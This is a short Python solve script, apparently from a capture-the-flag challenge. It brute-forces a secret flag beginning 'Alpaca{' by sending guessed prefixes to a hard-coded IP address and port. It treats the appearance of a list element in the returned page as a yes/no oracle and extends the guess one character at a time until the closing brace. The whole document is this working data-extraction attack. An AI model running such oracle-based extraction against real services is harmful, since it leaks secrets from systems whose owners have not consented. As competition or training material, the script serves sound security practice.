import time
import requests
from bs4 import BeautifulSoup

target_url = "http://34.170.146.252:57683/?q="

current_flag = "Alpaca{"

string_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" + "_}"

while True:
    for c in string_chars:
        time.sleep(0.1)
        resp = requests.get(target_url + current_flag + c)
        soup = BeautifulSoup(resp.text, "html.parser")
        ul_tag = soup.find("ul")
        if ul_tag:
            current_flag += c
            print(f"[+] Found char: {c} -> Current: {current_flag}")
            if current_flag[-1] == "}":
                print(f"\n[SUCCESS] Flag found: {current_flag}")
                exit()
            break
